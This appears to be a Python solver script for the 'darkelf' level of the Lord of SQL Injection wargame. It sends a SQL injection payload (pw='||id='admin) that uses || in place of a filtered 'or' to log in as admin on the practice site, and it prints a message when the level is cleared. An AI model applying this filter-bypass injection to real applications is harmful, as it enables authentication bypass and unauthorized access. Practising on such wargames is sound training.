#!/usr/bin/python
# coding: utf-8

import requests

url = "http://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php"
param = "?pw=%27||id=%27admin"

session = raw_input("Input your LOS session : ")
# session = "gequo9hff2f19sjmieftjnuf50"

headers = {
    'Cookie': 'PHPSESSID={0}'.format(session)
}


r = requests.get(url + param, headers=headers)

if r.text.find("<h2>DARKELF Clear!</h2>") > 0:
    print("DarkElf Clear!")
    
